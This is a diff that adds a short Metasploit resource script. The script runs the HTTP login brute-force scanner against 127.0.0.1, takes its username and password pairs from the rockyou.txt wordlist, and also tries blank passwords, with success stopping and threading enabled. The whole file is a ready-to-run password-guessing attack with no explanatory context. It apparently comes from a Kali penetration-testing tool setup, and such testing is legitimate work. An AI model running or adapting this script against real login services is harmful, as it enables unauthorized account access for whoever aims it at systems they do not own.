@@ -1,0 +1,8 @@
+use auxiliary/scanner/http/http_login
+set RHOSTS 127.0.0.1
+set STOP_ON_SUCCESS true
+set VERBOSE true
+set USERPASS_FILE /home/kali/Downloads/Tools_auto/rockyou.txt
+set BLANK_PASSWORDS true
+set THREADS 5
+run
